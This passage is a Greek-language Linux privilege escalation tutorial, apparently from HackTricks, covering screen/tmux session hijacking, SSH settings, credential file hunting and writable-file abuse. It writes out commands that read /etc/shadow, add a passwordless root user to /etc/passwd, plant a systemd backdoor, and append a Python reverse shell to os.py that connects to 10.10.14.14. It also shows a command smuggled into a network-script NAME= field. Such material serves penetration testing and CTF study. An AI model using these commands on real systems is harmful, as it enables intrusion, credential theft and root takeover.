Σε **νεότερες εκδόσεις** θα μπορείς να **συνδεθείς** μόνο σε screen sessions του **δικού σου user**. Ωστόσο, μπορεί να βρεις **ενδιαφέρουσες πληροφορίες μέσα στη session**.

### screen sessions hijacking

**Λίστα των screen sessions**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions

# Socket locations (some systems expose one as symlink of the other)
ls /run/screen/ /var/run/screen/ 2>/dev/null
```
![Παραβίαση screen sessions - Τοποθεσίες socket (ορισμένα συστήματα εκθέτουν το ένα ως symlink του άλλου): ls /run/screen/ /var/run/screen/ 2 /dev/null](<../../images/image (141).png>)

**Σύνδεση σε ένα session**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## Παραβίαση συνεδριών tmux

Αυτό ήταν πρόβλημα στις **παλιές εκδόσεις του tmux**. Δεν μπόρεσα να παραβιάσω μια συνεδρία tmux (v2.1) που είχε δημιουργηθεί από τον root ως μη προνομιούχος χρήστης.

**Λίστα συνεδριών tmux**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![Socket locations (some systems expose one as symlink of the other) - tmux sessions hijacking: tmux -S /tmp/dev sess ls Λίστα με χρήση αυτού του socket, μπορείτε να ξεκινήσετε ένα tmux session σε αυτό το socket...](<../../images/image (837).png>)

**Σύνδεση σε ένα session**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Δείτε το **Valentine box από το HTB** για ένα παράδειγμα.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Όλα τα SSL και SSH keys που δημιουργήθηκαν σε Debian based systems (Ubuntu, Kubuntu κ.λπ.) μεταξύ του Σεπτεμβρίου 2006 και της 13ης Μαΐου 2008 ενδέχεται να επηρεάζονται από αυτό το bug.\
Αυτό το bug προκαλείται κατά τη δημιουργία ενός νέου ssh key σε αυτά τα OS, καθώς **ήταν δυνατές μόνο 32.768 παραλλαγές**. Αυτό σημαίνει ότι όλες οι πιθανότητες μπορούν να υπολογιστούν και **έχοντας το ssh public key μπορείτε να αναζητήσετε το αντίστοιχο private key**. Μπορείτε να βρείτε τις υπολογισμένες πιθανότητες εδώ: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### Ενδιαφέρουσες τιμές configuration του SSH

- **PasswordAuthentication:** Καθορίζει αν επιτρέπεται authentication με password. Η προεπιλογή είναι `no`.
- **PubkeyAuthentication:** Καθορίζει αν επιτρέπεται authentication με public key. Η προεπιλογή είναι `yes`.
- **PermitEmptyPasswords**: Όταν επιτρέπεται authentication με password, καθορίζει αν ο server επιτρέπει login σε accounts με κενά password strings. Η προεπιλογή είναι `no`.

### Αρχεία ελέγχου login

Αυτά τα αρχεία επηρεάζουν το ποιος μπορεί να κάνει login και με ποιον τρόπο:

- **`/etc/nologin`**: αν υπάρχει, αποκλείει τα login που δεν γίνονται από τον root και εμφανίζει το μήνυμά του.
- **`/etc/securetty`**: περιορίζει από πού μπορεί να κάνει login ο root (TTY allowlist).
- **`/etc/motd`**: banner μετά το login (μπορεί να κάνει leak πληροφορίες για το environment ή τη συντήρηση).

### PermitRootLogin

Καθορίζει αν ο root μπορεί να κάνει login χρησιμοποιώντας ssh· η προεπιλογή είναι `no`. Πιθανές τιμές:

- `yes`: ο root μπορεί να κάνει login χρησιμοποιώντας password και private key
- `without-password` ή `prohibit-password`: ο root μπορεί να κάνει login μόνο με private key
- `forced-commands-only`: Ο root μπορεί να κάνει login μόνο χρησιμοποιώντας private key και αν έχουν καθοριστεί οι command options
- `no` : όχι

### AuthorizedKeysFile

Καθορίζει αρχεία που περιέχουν τα public keys τα οποία μπορούν να χρησιμοποιηθούν για user authentication. Μπορεί να περιέχει tokens όπως `%h`, τα οποία αντικαθίστανται από το home directory. **Μπορείτε να υποδείξετε absolute paths** (που ξεκινούν με `/`) ή **relative paths από το home του user**. Για παράδειγμα:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Αυτή η ρύθμιση υποδεικνύει ότι, αν προσπαθήσετε να συνδεθείτε με το **private** key του user "**testusername**", το ssh θα συγκρίνει το public key του key σας με αυτά που βρίσκονται στα `/home/testusername/.ssh/authorized_keys` και `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

Το SSH agent forwarding σάς επιτρέπει να **χρησιμοποιείτε τα local SSH keys σας αντί να αφήνετε keys** (χωρίς passphrases!) αποθηκευμένα στον server σας. Έτσι, θα μπορείτε να κάνετε **jump** μέσω ssh **σε έναν host** και από εκεί **να κάνετε jump σε έναν άλλο** host **χρησιμοποιώντας** το **key** που βρίσκεται στον **αρχικό host** σας.

Πρέπει να ορίσετε αυτή την επιλογή στο `$HOME/.ssh.config` ως εξής:
```
Host example.com
ForwardAgent yes
```
Σημειώστε ότι αν το `Host` είναι `*`, κάθε φορά που ο χρήστης μεταβαίνει σε διαφορετικό machine, αυτό το host θα μπορεί να έχει πρόσβαση στα keys (κάτι που αποτελεί security issue).

Το αρχείο `/etc/ssh_config` μπορεί να **παρακάμψει αυτές τις** **options** και να επιτρέψει ή να απαγορεύσει αυτήν τη ρύθμιση.\
Το αρχείο `/etc/sshd_config` μπορεί να **επιτρέψει** ή να **απαγορεύσει** το ssh-agent forwarding με το keyword `AllowAgentForwarding` (η προεπιλογή είναι allow).

Αν διαπιστώσετε ότι το Forward Agent είναι ρυθμισμένο σε ένα environment, διαβάστε την ακόλουθη σελίδα, καθώς **ενδέχεται να μπορείτε να το κάνετε abuse για privilege escalation**:


{{#ref}}
../../user-information/ssh-forward-agent-exploitation.md
{{#endref}}

## Ενδιαφέροντα Αρχεία

### Αρχεία Profiles

Το αρχείο `/etc/profile` και τα αρχεία μέσα στο `/etc/profile.d/` είναι **scripts που εκτελούνται όταν ένας χρήστης ανοίγει ένα νέο shell**. Επομένως, αν μπορείτε να **γράψετε ή να τροποποιήσετε οποιοδήποτε από αυτά, μπορείτε να κάνετε privilege escalation**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Αν βρεθεί οποιοδήποτε περίεργο profile script, θα πρέπει να το ελέγξετε για **sensitive details**.

### Αρχεία Passwd/Shadow

Ανάλογα με το OS, τα αρχεία `/etc/passwd` και `/etc/shadow` μπορεί να χρησιμοποιούν διαφορετικό όνομα ή να υπάρχει κάποιο backup. Επομένως, συνιστάται να **τα βρείτε όλα** και να **ελέγξετε αν μπορείτε να τα διαβάσετε**, για να δείτε **αν περιέχουν hashes**:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
Σε ορισμένες περιπτώσεις μπορεί να βρείτε **hashes κωδικών πρόσβασης** μέσα στο αρχείο `/etc/passwd` (ή το αντίστοιχο αρχείο)
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Εγγράψιμο /etc/passwd

Αρχικά, δημιουργήστε έναν κωδικό πρόσβασης με μία από τις ακόλουθες εντολές.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Στη συνέχεια, προσθέστε τον χρήστη `hacker` και τον κωδικό πρόσβασης που δημιουργήθηκε.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Π.χ.: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Μπορείτε πλέον να χρησιμοποιήσετε την εντολή `su` με `hacker:hacker`

Εναλλακτικά, μπορείτε να χρησιμοποιήσετε τις ακόλουθες γραμμές για να προσθέσετε έναν dummy user χωρίς κωδικό πρόσβασης.\
ΠΡΟΕΙΔΟΠΟΙΗΣΗ: ενδέχεται να υποβαθμίσετε την τρέχουσα ασφάλεια του machine.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
ΣΗΜΕΙΩΣΗ: Στις πλατφόρμες BSD το `/etc/passwd` βρίσκεται στα `/etc/pwd.db` και `/etc/master.passwd`, ενώ το `/etc/shadow` έχει μετονομαστεί σε `/etc/spwd.db`.

Θα πρέπει να ελέγξετε αν μπορείτε να **γράψετε σε ορισμένα ευαίσθητα αρχεία**. Για παράδειγμα, μπορείτε να γράψετε σε κάποιο **αρχείο ρυθμίσεων υπηρεσίας**;
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Για παράδειγμα, αν το machine εκτελεί έναν **tomcat** server και μπορείς να **τροποποιήσεις το αρχείο διαμόρφωσης της υπηρεσίας Tomcat μέσα στο /etc/systemd/,** τότε μπορείς να τροποποιήσεις τις γραμμές:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Το backdoor σας θα εκτελεστεί την επόμενη φορά που θα εκκινηθεί το tomcat.

### Έλεγχος φακέλων

Οι ακόλουθοι φάκελοι ενδέχεται να περιέχουν backups ή ενδιαφέρουσες πληροφορίες: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Πιθανότατα δεν θα μπορέσετε να διαβάσετε τον τελευταίο, αλλά δοκιμάστε)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Περίεργη τοποθεσία/αρχεία με ασυνήθιστο ιδιοκτήτη
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Τροποποιημένα αρχεία τα τελευταία λεπτά
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Αρχεία βάσεων δεδομένων Sqlite
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### αρχεία \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Κρυφά αρχεία
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Scripts/Binaries στο PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Web files**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Αντίγραφα ασφαλείας**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Γνωστά αρχεία που περιέχουν κωδικούς πρόσβασης

Διαβάστε τον κώδικα του [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), καθώς αναζητά **αρκετά πιθανά αρχεία που θα μπορούσαν να περιέχουν κωδικούς πρόσβασης**.\
**Ένα ακόμη ενδιαφέρον tool** που μπορείτε να χρησιμοποιήσετε για αυτόν τον σκοπό είναι το [**LaZagne**](https://github.com/AlessandroZ/LaZagne), μια open source εφαρμογή που χρησιμοποιείται για την ανάκτηση πολλών κωδικών πρόσβασης αποθηκευμένων σε έναν τοπικό υπολογιστή για Windows, Linux & Mac.

### Logs

Αν μπορείτε να διαβάσετε logs, ενδέχεται να μπορέσετε να βρείτε **ενδιαφέρουσες/εμπιστευτικές πληροφορίες μέσα σε αυτά**. Όσο πιο παράξενο είναι το log, τόσο πιο ενδιαφέρον θα είναι (πιθανότατα).\
Επίσης, ορισμένα **«κακώς» ρυθμισμένα (backdoored;) **audit logs** ενδέχεται να σας επιτρέψουν να **καταγράψετε κωδικούς πρόσβασης** μέσα σε audit logs, όπως εξηγείται σε αυτήν την ανάρτηση: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Για να **διαβάζετε logs, η ομάδα** [**adm**](../../user-information/interesting-groups-linux-pe/index.html#adm-group) θα είναι ιδιαίτερα χρήσιμη.

### Αρχεία Shell
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

Θα πρέπει επίσης να ελέγξετε για αρχεία που περιέχουν τη λέξη "**password**" στο **όνομά** τους ή μέσα στο **περιεχόμενό** τους, καθώς και για IPs και emails μέσα σε logs ή regexps για hashes.\
Δεν πρόκειται να παραθέσω εδώ πώς να τα κάνετε όλα αυτά, αλλά αν ενδιαφέρεστε μπορείτε να ελέγξετε τους τελευταίους ελέγχους που εκτελεί το [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh).

## Writable files

### Python library hijacking

Αν γνωρίζετε **από πού** πρόκειται να εκτελεστεί ένα python script και **μπορείτε να γράψετε μέσα** σε αυτόν τον φάκελο ή μπορείτε να **τροποποιήσετε python libraries**, μπορείτε να τροποποιήσετε τη βιβλιοθήκη του OS και να την κάνετε backdoor (αν μπορείτε να γράψετε εκεί όπου πρόκειται να εκτελεστεί το python script, αντιγράψτε και επικολλήστε τη βιβλιοθήκη os.py).

Για να κάνετε **backdoor τη βιβλιοθήκη**, απλώς προσθέστε στο τέλος της βιβλιοθήκης os.py την ακόλουθη γραμμή (αλλάξτε τα IP και PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Εκμετάλλευση του Logrotate

Μια ευπάθεια στο `logrotate` επιτρέπει σε χρήστες με **δικαιώματα εγγραφής** σε ένα αρχείο log ή στους γονικούς καταλόγους του να αποκτήσουν δυνητικά κλιμακωμένα δικαιώματα. Αυτό συμβαίνει επειδή το `logrotate`, που συχνά εκτελείται ως **root**, μπορεί να χειραγωγηθεί ώστε να εκτελέσει αυθαίρετα αρχεία, ειδικά σε καταλόγους όπως ο _**/etc/bash_completion.d/**_. Είναι σημαντικό να ελέγχετε τα δικαιώματα όχι μόνο στο _/var/log_, αλλά και σε οποιονδήποτε κατάλογο όπου εφαρμόζεται log rotation.

> [!TIP]
> Αυτή η ευπάθεια επηρεάζει την έκδοση `3.18.0` και παλαιότερες του `logrotate`

Περισσότερες λεπτομέρειες σχετικά με την ευπάθεια μπορείτε να βρείτε σε αυτή τη σελίδα: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Μπορείτε να εκμεταλλευτείτε αυτή την ευπάθεια με το [**logrotten**](https://github.com/whotwagner/logrotten).

Αυτή η ευπάθεια είναι πολύ παρόμοια με το [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(logs του nginx),** επομένως, κάθε φορά που διαπιστώνετε ότι μπορείτε να τροποποιήσετε logs, ελέγξτε ποιος διαχειρίζεται αυτά τα logs και αν μπορείτε να κλιμακώσετε τα δικαιώματα αντικαθιστώντας τα logs με symlinks.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Αναφορά ευπάθειας:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Αν, για οποιονδήποτε λόγο, ένας χρήστης μπορεί να **γράψει** ένα script `ifcf-<whatever>` στον κατάλογο _/etc/sysconfig/network-scripts_ **ή** μπορεί να **τροποποιήσει** ένα υπάρχον, τότε το **system είναι pwned**.

Τα network scripts, για παράδειγμα το _ifcg-eth0_, χρησιμοποιούνται για συνδέσεις δικτύου. Μοιάζουν ακριβώς με αρχεία .INI. Ωστόσο, γίνονται \~sourced\~ στο Linux από το Network Manager (dispatcher.d).

Στην περίπτωσή μου, το attribute `NAME=` σε αυτά τα network scripts δεν υποβάλλεται σε σωστό χειρισμό. Αν το όνομα περιέχει **κενό διάστημα, το system προσπαθεί να εκτελέσει το τμήμα μετά το κενό διάστημα**. Αυτό σημαίνει ότι **ό,τι βρίσκεται μετά το πρώτο κενό διάστημα εκτελείται ως root**.

Για παράδειγμα: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Σημειώστε το κενό διάστημα μεταξύ των Network και /bin/id_)

### **init, init.d, systemd και rc.d**

Ο κατάλογος `/etc/init.d` περιέχει **scripts** για το System V init (SysVinit), το **κλασικό σύστημα διαχείρισης υπηρεσιών του Linux**. Περιλαμβάνει scripts για `start`, `stop`, `restart` και, μερικές φορές, `reload` υπηρεσιών. Αυτά μπορούν να εκτελεστούν απευθείας ή μέσω συμβολικών συνδέσμων που βρίσκονται στο `/etc/rc?.d/`. Μια εναλλακτική διαδρομή σε συστήματα Redhat είναι η `/etc/rc.d/init.d`.

Από την άλλη πλευρά, το `/etc/init` σχετίζεται με το **Upstart**, ένα νεότερο **σύστημα διαχείρισης υπηρεσιών** που εισήγαγε το Ubuntu και χρησιμοποιεί αρχεία διαμόρφωσης για εργασίες διαχείρισης υπηρεσιών. Παρά τη μετάβαση στο Upstart, τα scripts του SysVinit εξακολουθούν να χρησιμοποιούνται παράλληλα με τις διαμορφώσεις του Upstart, χάρη σε ένα compatibility layer του Upstart.

Το **systemd** εμφανίζεται ως ένας σύγχρονος initialization και service manager, προσφέροντας προηγμένες δυνατότητες όπως εκκίνηση daemon on-demand, διαχείριση automount και snapshots της κατάστασης του συστήματος. Οργανώνει τα αρχεία στον κατάλογο `/usr/lib/systemd/` για τα distribution packages και στον `/etc/systemd/system/` για τροποποιήσεις από administrators, απλοποιώντας τη διαδικασία system administration.

## Άλλα Tricks

### NFS Privilege escalation


{{#ref}}
../../interesting-files-permissions/nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
../../main-system-information/escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
../../network-information/cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Τα Android rooting frameworks συνήθως κάνουν hook σε ένα syscall για να εκθέσουν privileged kernel functionality σε έναν userspace manager. Η αδύναμη authentication του manager (π.χ. signature checks που βασίζονται στη σειρά των FD ή αδύναμα password schemes) μπορεί να επιτρέψει σε μια local app να impersonate τον manager και να κάνει escalate σε root σε συσκευές που είναι ήδη rooted. Μάθετε περισσότερα και δείτε λεπτομέρειες exploitation εδώ:


{{#ref}}
../../software-information/android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) μέσω regex-based exec (CVE-2025-41244)

Το regex-driven service discovery στο VMware Tools/Aria Operations μπορεί να εξαγάγει ένα binary path από τις command lines των processes και να το εκτελέσει με `-v` σε privileged context. Τα permissive patterns (π.χ. η χρήση του `\S`) μπορεί να κάνουν match σε listeners που έχουν τοποθετηθεί από attacker σε writable locations (π.χ. `/tmp/httpd`), οδηγώντας σε execution ως root (CWE-426 Untrusted Search Path).

Μάθετε περισσότερα και δείτε ένα generalized pattern που εφαρμόζεται σε άλλα discovery/monitoring stacks εδώ:

{{#ref}}
../../main-system-information/kernel-lpe-cves/vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Περισσότερη βοήθεια

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Καλύτερο tool για την αναζήτηση Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [0xdf – Holiday Hack Challenge 2025: Neighborhood Watch Bypass (sudo env_keep PATH hijack)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [0xdf – HTB Previous (sudo terraform dev_overrides + TF_VAR symlink privesc)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [0xdf – HTB Slonik (pg_basebackup cron copy → SUID bash)](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)
- [0xdf – HTB: Expressway](https://0xdf.gitlab.io/2026/03/07/htb-expressway.html)
- [0xdf – HTB: Browsed](https://0xdf.gitlab.io/2026/03/28/htb-browsed.html)
- [PEP 3147 – PYC Repository Directories](https://peps.python.org/pep-3147/)
- [Python importlib docs](https://docs.python.org/3/library/importlib.html)

{{#include ../../../banners/hacktricks-training.md}}
